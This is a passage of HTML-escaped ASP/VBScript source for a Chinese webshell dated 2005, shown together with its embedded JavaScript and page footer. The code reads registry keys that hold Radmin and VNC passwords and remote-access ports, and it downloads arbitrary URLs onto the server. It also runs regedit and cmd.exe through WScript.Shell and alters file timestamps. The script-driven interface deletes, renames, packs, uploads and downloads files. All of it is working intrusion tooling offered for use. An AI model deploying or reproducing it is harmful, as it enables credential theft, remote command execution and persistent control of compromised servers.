	Echo "&lt;form method=post action='' target=_blank>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(sHeader, "{$s}", "文件编辑")
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;&lt;input size=80 name=truePath value=""" &amp; HtmlEncode(Request.ServerVariables("PATH_TRANSLATED")) &amp; """>"
	Echo "&lt;input type=hidden value=showedit name=theAct>"
	Echo "&lt;select name=PageName>&lt;option value=PageApp>用Stream&lt;/option>&lt;option value=PageFso>用FSO&lt;/option>&lt;/select>"
	Echo "&lt;input type=submit value='打 开'>&lt;/td>&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"
	
	Echo "&lt;form method=post target=_blank>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(sHeader, "{$s}", "注册表键值读取")
	Echo "&lt;input type=hidden value=PageOtherTools name=PageName>"
	Echo "&lt;input type=hidden value=ReadReg name=theAct>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;"
	Echo "&lt;select onChange='this.form.thePath.value=this.value;'>"
	Echo "&lt;option value=''>选择自带&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots\/'>WebPath&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter'>RadminPass&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Port'>RadminPort&lt;/option>"
	Echo "&lt;option value='HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'>VNC3Pass&lt;/option>"
	Echo "&lt;option value='HKEY_CURRENT_USER\Software\ORL\WinVNC3\PortNumber'>VNC3Port&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password'>VNC4Pass&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\PortNumber'>VNC4Port&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\Wds\Repwd\Tds\Tcp\PortNumber'>TerminalPort&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\PortNumber'>TerminalPort&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort'>PcAnyWhereDataPort&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort'>PcAnyWhereStatusPort&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Application\File'>Application Log&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Security\File'>Security Log&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\System\File'>System Log&lt;/option>"
	Echo "&lt;option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log&lt;/option>"
	Echo "&lt;/select>&lt;br />"
	Echo "&amp;nbsp;&lt;input name=thePath value='' size=80>"
	Echo "&lt;input type=button value='读 键' onclick=""this.form.theAct.value='ReadRegX';this.form.submit();"">"
	Echo "&lt;input type=button value='读键值' onclick=""this.form.theAct.value='ReadReg';this.form.submit();"">"
	Echo "&lt;/td>&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"
End Sub

Sub DownFromUrl()
	If isDebugMode = False Then On Error Resume Next
	Dim Http, theUrl, thePath, stream, fileName, overWrite
	theUrl = Request("theUrl")
	thePath = Request("thePath")
	overWrite = Request("overWrite")
	Set stream = Server.CreateObject("Adodb.Stream")
	Set Http = Server.CreateObject("MSXML2.XMLHTTP")
	
	If overWrite &lt;> 2 Then
		overWrite = 1
	End If
	
	Http.Open "GET", theUrl, False
	Http.Send()
	If Http.ReadyState &lt;> 4 Then 
		Exit Sub
	End If
	
	With stream
		.Type = 1
		.Mode = 3
		.Open
		.Write Http.ResponseBody
		.Position = 0
		.SaveToFile thePath, overWrite
		If Err.Number = 3004 Then
			Err.Clear
			fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
			If fileName = "" Then
				fileName = "index.htm.txt"
			End If
			thePath = thePath &amp; "\" &amp; fileName
			.SaveToFile thePath, overWrite
		End If
		.Close
	End With
	ChkErr(Err)
	
	AlertThenClose("文件 " &amp; Replace(thePath, "\", "\\") &amp; " 下载成功!")
	
	Set Http = Nothing
	Set Stream = Nothing
End Sub

Sub FileCombiner(sFilePath)
	If isDebugMode = False Then On Error Resume Next
	Dim sFolder, sFileName, iFileCount, oStream, oStreamB
	Set oStream = Server.CreateObject("Adodb.Stream")
	Set oStreamB = Server.CreateObject("Adodb.Stream")
	sFileName = Mid(sFilePath, InStrRev(sFilePath, "\") + 1)
	sFolder = Left(sFilePath, InStrRev(sFilePath, "\"))
	iFileCount = Mid(sFileName, InStrRev(sFileName, "_") + 1)
	sFileName = Left(sFileName, InStrRev(sFileName, "_") - 1)
	oStream.Type = 1
	oStream.Mode = 3
	oStream.Open
	oStreamB.Open
	oStreamB.Type = 1
	For i = 1 To iFileCount
		oStreamB.LoadFromFile(sFolder &amp; "\" &amp; sFileName &amp; "_" &amp; i)
		oStream.Write oStreamB.Read()
	Next
	oStream.SaveToFile sFolder &amp; "\" &amp; sFileName, 2
	oStream.Close
	oStreamB.Close
	Set oStream = Nothing
	Set oStream = Nothing
End Sub

Sub ReadReg()
	If isDebugMode = False Then On Error Resume Next
	Dim i, thePath, theArray
	thePath = Request("thePath")
	theArray = oWshl.RegRead(thePath)
	If IsArray(theArray) Then
		For i = 0 To UBound(theArray)
			Echo "&lt;li>" &amp; theArray(i)
		Next
	 Else
		Echo "&lt;li>" &amp; theArray
	End If
	ChkErr(Err)
End Sub

Sub ReadRegX()
	Dim sCmd, sResult
	If isDebugMode = False Then On Error Resume Next
	sCmd = "RegEdit.exe /e """ &amp; rootPath &amp; "\ReadRegX"" """ &amp; thePath &amp; """"
	oWshl.Run sCmd, 0, True
	sResult = oWshl.Exec("cmd.exe /c type " &amp; rootPath &amp; "\ReadRegX").StdOut.ReadAll()
	Echo StrEncode(sResult)
	sResult = oWshl.Exec("cmd.exe /c del " &amp; rootPath &amp; "\ReadRegX").StdOut.ReadAll()
	Echo "&lt;br />" &amp; sResult
End Sub

Function DBDownTheFile(oValue)
	Response.Clear
	Response.AddHeader "Content-Disposition", "Attachment; Filename=UnKnown.UnKnown"
	Response.AddHeader "Content-Length", LenB(oValue)
	Response.Charset = "UTF-8"
	Response.ContentType = "Application/Octet-Stream"
	Response.BinaryWrite oValue
	Response.Flush
End Function

Sub PageOther()
	Echo "&lt;style id=theStyle>" &amp; vbNewLine
	Echo "BODY {" &amp; vbNewLine
	Echo "FONT-SIZE: 9pt;" &amp; vbNewLine
	Echo "COLOR: #000000;" &amp; vbNewLine
	Echo "background-color: #ffffff;" &amp; vbNewLine
	Echo "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
	Echo "scrollbar-face-color:#E4E4F3;" &amp; vbNewLine
	Echo "scrollbar-highlight-color:#FFFFFF;" &amp; vbNewLine
	Echo "scrollbar-3dlight-color:#E4E4F3;" &amp; vbNewLine
	Echo "scrollbar-darkshadow-color:#9C9CD3;" &amp; vbNewLine
	Echo "scrollbar-shadow-color:#E4E4F3;" &amp; vbNewLine
	Echo "scrollbar-arrow-color:#4444B3;" &amp; vbNewLine
	Echo "scrollbar-track-color:#EFEFEF;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "TABLE {" &amp; vbNewLine
	Echo "FONT-SIZE: 9pt;" &amp; vbNewLine
	Echo "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
	Echo "BORDER-COLLAPSE: collapse;" &amp; vbNewLine
	Echo "border-width: 1px;" &amp; vbNewLine
	Echo "border-top-style: solid;" &amp; vbNewLine
	Echo "border-right-style: none;" &amp; vbNewLine
	Echo "border-bottom-style: none;" &amp; vbNewLine
	Echo "border-left-style: solid;" &amp; vbNewLine
	Echo "border-color: #d8d8f0;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo ".tr {" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "font-size: 9pt;" &amp; vbNewLine
	Echo "background-color: #e4e4f3;" &amp; vbNewLine
	Echo "text-align: center;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo ".td {" &amp; vbNewLine
	Echo "height: 24px;" &amp; vbNewLine
	Echo "font-size: 9pt;" &amp; vbNewLine
	Echo "background-color: #f9f9fd;" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "input {" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "BORDER-TOP-WIDTH: 1px;" &amp; vbNewLine
	Echo "BORDER-LEFT-WIDTH: 1px;" &amp; vbNewLine
	Echo "FONT-SIZE: 12px;" &amp; vbNewLine
	Echo "BORDER-BOTTOM-WIDTH: 1px;" &amp; vbNewLine
	Echo "BORDER-RIGHT-WIDTH: 1px;" &amp; vbNewLine
	Echo "color: #000000;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "textarea {" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "BORDER-WIDTH: 1px;" &amp; vbNewLine
	Echo "FONT-SIZE: 12px;" &amp; vbNewLine
	Echo "color: #000000;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "A:visited {" &amp; vbNewLine
	Echo "FONT-SIZE: 9pt;" &amp; vbNewLine
	Echo "COLOR: #333333;" &amp; vbNewLine
	Echo "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
	Echo "TEXT-DECORATION: none;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "A:active {" &amp; vbNewLine
	Echo "FONT-SIZE: 9pt;" &amp; vbNewLine
	Echo "COLOR: #3366cc;" &amp; vbNewLine
	Echo "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
	Echo "TEXT-DECORATION: none;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "A:link {" &amp; vbNewLine
	Echo "FONT-SIZE: 9pt;" &amp; vbNewLine
	Echo "COLOR: #000000;" &amp; vbNewLine
	Echo "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
	Echo "TEXT-DECORATION: none;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "A:hover {" &amp; vbNewLine
	Echo "FONT-SIZE: 9pt;" &amp; vbNewLine
	Echo "COLOR: #3366cc;" &amp; vbNewLine
	Echo "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
	Echo "TEXT-DECORATION: none;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "tr {" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "font-size: 9pt;" &amp; vbNewLine
	Echo "line-height: 18px;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "td {" &amp; vbNewLine
	Echo "font-size: 9pt;" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "border-width: 1px;" &amp; vbNewLine
	Echo "border-top-style: none;" &amp; vbNewLine
	Echo "border-right-style: solid;" &amp; vbNewLine
	Echo "border-bottom-style: solid;" &amp; vbNewLine
	Echo "border-left-style: none;" &amp; vbNewLine
	Echo "border-color: #d8d8f0;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo ".trHead {" &amp; vbNewLine
	Echo "font-family: ""Courier New"";" &amp; vbNewLine
	Echo "height: 2px;" &amp; vbNewLine
	Echo "background-color: #e4e4f3;" &amp; vbNewLine
	Echo "line-height: 2px;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo ".fixSpan {" &amp; vbNewLine
	Echo "overflow: hidden;" &amp; vbNewLine
	Echo "white-space: nowrap;" &amp; vbNewLine
	Echo "text-overflow: ellipsis;" &amp; vbNewLine
	Echo "vertical-align: baseline;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo ".fixTable {" &amp; vbNewLine
	Echo "word-break: break-all;" &amp; vbNewLine
	Echo "word-wrap: break-word;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "#fileList span{" &amp; vbNewLine
	Echo "width: 120px;" &amp; vbNewLine
	Echo "line-height: 23px;" &amp; vbNewLine
	Echo "cursor: hand;" &amp; vbNewLine
	Echo "overflow: hidden;" &amp; vbNewLine
	Echo "padding-left: 5px;" &amp; vbNewLine
	Echo "white-space: nowrap;" &amp; vbNewLine
	Echo "text-overflow: ellipsis;" &amp; vbNewLine
	Echo "vertical-align: baseline;" &amp; vbNewLine
	Echo "border: 1px solid #ffffff;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "&lt;/style>" &amp; vbNewLine
	Echo "&lt;script language=javascript>" &amp; vbNewLine
	Echo "function wsLoadIFrame(){" &amp; vbNewLine
	Echo "cmdResult.document.body.innerHTML = ""&lt;form name=frm method=post action=\""?\"">&lt;input type=hidden name=PageName value=PageSaCmdRun />&lt;input type=hidden name='theAct' value='readResult' />&lt;/form>"";" &amp; vbNewLine
	Echo "cmdResult.document.frm.submit();" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function locate(str){" &amp; vbNewLine
	Echo "var frm = document.forms[1];" &amp; vbNewLine
	Echo "frm.theAct.value = str;" &amp; vbNewLine
	Echo "frm.TheObj.value = '';" &amp; vbNewLine
	Echo "frm.submit();" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function checkAllBox(obj){" &amp; vbNewLine
	Echo "var frm = document.forms[1];" &amp; vbNewLine
	Echo "for(var i = 0; i &lt; frm.elements.length; i++)" &amp; vbNewLine
	Echo "if(frm.elements[i].id != 'checkAll' &amp;&amp; frm.elements[i].type == 'checkbox')" &amp; vbNewLine
	Echo "frm.elements[i].checked = obj.checked;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function changeThePath(str){" &amp; vbNewLine
	Echo "var frm = document.forms[1];" &amp; vbNewLine
	Echo "frm.theAct.value = '';" &amp; vbNewLine
	Echo "frm.thePath.value = str;" &amp; vbNewLine
	Echo "frm.submit();" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function GetPageList(iPage, iCount, iPageCount, iListSize, sLinks)" &amp; vbNewLine
	Echo "{" &amp; vbNewLine
	Echo "var iCurrPage" &amp; vbNewLine
	Echo "if(iPageCount &lt;= 1) return false;" &amp; vbNewLine
	Echo "if(iPage > iPageCount) iPage = iPageCount;" &amp; vbNewLine
	Echo "iCurrPage = Math.ceil(iPage / iListSize);" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "document.write(""&lt;div align=\""left\"">&amp;nbsp;"");" &amp; vbNewLine
	Echo "document.write(""共"" + iCount + ""条记录, "" + iPageCount + ""页&amp;nbsp;"");" &amp; vbNewLine
	Echo "document.write(""&lt;a href=\""javascript:Command('Query','1');\"">&lt;font face=\""Webdings\"">9&lt;/font>&lt;/a>"");" &amp; vbNewLine
	Echo "if(iCurrPage > 1)" &amp; vbNewLine
	Echo "{" &amp; vbNewLine
	Echo "document.write(""&lt;a href=\""javascript:Command('Query','"" + ((iCurrPage - 2) * iListSize + 1) + ""');\"">&lt;font face=\""Webdings\"">7&lt;/font>&lt;/a>&amp;nbsp;"");" &amp; vbNewLine
	Echo "}else{" &amp; vbNewLine
	Echo "document.write(""&lt;font face=\""Webdings\"">7&lt;/font>&amp;nbsp;"");" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "for(var i = (iCurrPage - 1) * iListSize + 1; i &lt;= iCurrPage * iListSize; i++)" &amp; vbNewLine
	Echo "{" &amp; vbNewLine
	Echo "if(i > iPageCount) break;" &amp; vbNewLine
	Echo "document.write(""&lt;a href=\""javascript:Command('Query','"" + i + ""');\"">"");" &amp; vbNewLine
	Echo "if(i == iPage) document.write(""&lt;strong>"" + i + ""&lt;/strong>""); else document.write(i);" &amp; vbNewLine
	Echo "document.write(""&lt;/a>&amp;nbsp;"");" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "if(iCurrPage &lt; Math.ceil(iPageCount / iListSize))" &amp; vbNewLine
	Echo "{" &amp; vbNewLine
	Echo "document.write(""&lt;a href=\""javascript:Command('Query','"" + (iCurrPage * iListSize + 1) + ""');\"">&lt;font face=\""Webdings\"">8&lt;/font>&lt;/a>"");" &amp; vbNewLine
	Echo "}else{" &amp; vbNewLine
	Echo "document.write(""&lt;font face=\""Webdings\"">8&lt;/font>"");" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "document.write(""&lt;a href=\""javascript:Command('Query','"" + iPageCount + ""');\"">&lt;font face=\""Webdings\"">:&lt;/font>&lt;/a>"");" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "if(Math.ceil(iPageCount / iListSize) >= 2) document.write(""&amp;nbsp;&lt;input id=\""page\"" value=\"""" + iPage + ""\"" style=\""width:24px;text-align:center;\"" />&lt;input type=\""button\"" value=\""GO\"" onclick=\""javascript:Command('Query',document.getElementById('page').value);\"" />"");" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "document.write(""&amp;nbsp;&lt;/div>"");" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function Command(cmd, str){" &amp; vbNewLine
	Echo "var j = 0;" &amp; vbNewLine
	Echo "var strTmpB;" &amp; vbNewLine
	Echo "var strTmp = str;" &amp; vbNewLine
	Echo "var frm = document.forms[1];" &amp; vbNewLine
	Echo "strTmpB = frm.PageName.value;" &amp; vbNewLine
	Echo "if(str &amp;&amp; str.indexOf(""*"") != -1)" &amp; vbNewLine
	Echo "{" &amp; vbNewLine
	Echo "str = str.split(""*"")[0];" &amp; vbNewLine
	Echo "strTmp = strTmp.split(""*"")[1];" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'pack' || cmd == 'del'){" &amp; vbNewLine
	Echo "for(var i = 0; i &lt; frm.elements.length; i++)" &amp; vbNewLine
	Echo "if(frm.elements[i].name != 'checkAll' &amp;&amp; frm.elements[i].type == 'checkbox' &amp;&amp; frm.elements[i].checked)" &amp; vbNewLine
	Echo "j ++;" &amp; vbNewLine
	Echo "if(j == 0)return;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'rename' || cmd == 'saveas' || cmd == 'move'){" &amp; vbNewLine
	Echo "frm.theAct.value = cmd;" &amp; vbNewLine
	Echo "frm.param.value = str + ',';" &amp; vbNewLine
	Echo "str = prompt('请输入新名称(位置)\n另存为和移动操作无法直接更改文件名.', strTmp);" &amp; vbNewLine
	Echo "if(str &amp;&amp; (strTmp != str)){" &amp; vbNewLine
	Echo "frm.param.value += str;" &amp; vbNewLine
	Echo "}else return;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "if(cmd=='lastmodify'){" &amp; vbNewLine
	Echo "frm.theAct.value = cmd;" &amp; vbNewLine
	Echo "frm.param.value = str + ',';" &amp; vbNewLine
	Echo "str = prompt('请输入新的""最后修改时间"".', strTmp);" &amp; vbNewLine
	Echo "if(!str || str == strTmp)return;" &amp; vbNewLine
	Echo "frm.param.value+= str;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'download'){" &amp; vbNewLine
	Echo "frm.theAct.value = 'download';" &amp; vbNewLine
	Echo "frm.param.value = str;" &amp; vbNewLine
	Echo "if(!confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先更改文件的后缀名为sys,\n然后通过http协议直接下载.\n按\""确定\""用流来进行下载.'))" &amp; vbNewLine
	Echo "return;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "" &amp; vbNewLine
	Echo "if(cmd == 'dbdownfile'){" &amp; vbNewLine
	Echo "frm.theAct.value = 'dbdownfile';" &amp; vbNewLine
	Echo "frm.param.value+= '!' + str;" &amp; vbNewLine
	Echo "eval(""frm."" + str + ""_Column.value=''"");" &amp; vbNewLine
	Echo "if(!confirm('文件大小未知,您确认要下载该文件吗,该操作可能导致远程服务器暂不可用.'))" &amp; vbNewLine
	Echo "return;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'submit'){" &amp; vbNewLine
	Echo "frm.theAct.value = '';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'del'){" &amp; vbNewLine
	Echo "if(confirm('您确认要删除选中的 ' + j + ' 个文件(夹)吗?')){" &amp; vbNewLine
	Echo "frm.theAct.value = 'del';" &amp; vbNewLine
	Echo "}else return;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'newone')" &amp; vbNewLine
	Echo "if(strTmp = prompt('请输入要新建的文件(夹)名\nApp文件浏览操作器只能新建文件', '')){" &amp; vbNewLine
	Echo "frm.theAct.value = 'newone';" &amp; vbNewLine
	Echo "frm.param.value = strTmp + ',' + str;" &amp; vbNewLine
	Echo "}else return;" &amp; vbNewLine
	Echo "if(cmd == 'move' || cmd == 'copy'){" &amp; vbNewLine
	Echo "frm.theAct.value = cmd;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'showedit' || cmd == 'showimage'){" &amp; vbNewLine
	Echo "frm.theAct.value = cmd;" &amp; vbNewLine
	Echo "frm.param.value = str;" &amp; vbNewLine
	Echo "frm.target = '_blank';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'Query'){" &amp; vbNewLine
	Echo "if(str == '0'){" &amp; vbNewLine
	Echo "str = 1;" &amp; vbNewLine
	Echo "}else{" &amp; vbNewLine
	Echo "frm.reset();" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "frm.theAct.value = cmd;" &amp; vbNewLine
	Echo "frm.param.value = str;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'access'){" &amp; vbNewLine
	Echo "frm.theAct.value = 'ShowTables';" &amp; vbNewLine
	Echo "strTmp = frm.PageName.value;" &amp; vbNewLine
	Echo "frm.PageName.value = 'PageDBTool';" &amp; vbNewLine
	Echo "frm.thePath.value = frm.truePath.value + '\\' + str;" &amp; vbNewLine
	Echo "frm.target = '_blank';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'upload'){" &amp; vbNewLine
	Echo "frm.PageName.value = 'PageUpload';" &amp; vbNewLine
	Echo "frm.thePath.value = frm.truePath.value;" &amp; vbNewLine
	Echo "frm.target = '_blank';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "if(cmd == 'pack'){" &amp; vbNewLine
	Echo "if(confirm('您确认要打包选中的 ' + j + ' 个项目吗?')){" &amp; vbNewLine
	Echo "frm.PageName.value = 'PagePack';" &amp; vbNewLine
	Echo "frm.theAct.value = 'PackOne';" &amp; vbNewLine
	Echo "frm.target = '_blank';" &amp; vbNewLine
	Echo "}else return;" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "frm.submit();" &amp; vbNewLine
	Echo "frm.target = '';" &amp; vbNewLine
	Echo "frm.PageName.value = strTmpB;" &amp; vbNewLine
	Echo "frm.reset();" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function showSqlEdit(column, str){" &amp; vbNewLine
	Echo "var frm = document.forms[1];" &amp; vbNewLine
	Echo "if(!str)return;" &amp; vbNewLine
	Echo "frm.reset();" &amp; vbNewLine
	Echo "frm.theAct.value = 'edit';" &amp; vbNewLine
	Echo "frm.param.value = column + '!' + str;" &amp; vbNewLine
	Echo "frm.target = '_blank';" &amp; vbNewLine
	Echo "frm.submit();" &amp; vbNewLine
	Echo "frm.target = '';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function sqlDelete(column, str){" &amp; vbNewLine
	Echo "var frm = document.forms[1];" &amp; vbNewLine
	Echo "if(!str)return;" &amp; vbNewLine
	Echo "if(!confirm('确认要删除这条记录?'))return;" &amp; vbNewLine
	Echo "frm.reset();" &amp; vbNewLine
	Echo "frm.theAct.value = 'del';" &amp; vbNewLine
	Echo "frm.param.value = column + '!' + str;" &amp; vbNewLine
	Echo "frm.target = '_blank';" &amp; vbNewLine
	Echo "frm.submit();" &amp; vbNewLine
	Echo "frm.target = '';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "function preView(n){" &amp; vbNewLine
	Echo "var url, win;" &amp; vbNewLine
	Echo "if(n != '1'){" &amp; vbNewLine
	Echo "url = document.forms[1].truePath.value" &amp; vbNewLine
	Echo "window.open('/' + escape(url));" &amp; vbNewLine
	Echo "}else{" &amp; vbNewLine
	Echo "win = window.open(""about:blank"", """", ""resizable=yes,scrollbars=yes"");" &amp; vbNewLine
	Echo "win.document.write('&lt;style>body{border:none;}&lt;/style>' + document.forms[1].fileContent.innerText);" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "&lt;/script>" &amp; vbNewLine
End Sub</textarea></td></tr><tr><td align="center" class="td"> <input type="submit" name="Submit3" value="提 交" onClick="this.form.action=this.form.theAction.value;"> <input type="reset" name="Submit32" value="重 置"></td></tr><tr><td class="trHead">&nbsp;</td></tr><tr> <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782
http://hididi.net">Marcos</a> 2005.11&nbsp;</td></tr></form></table></body></html>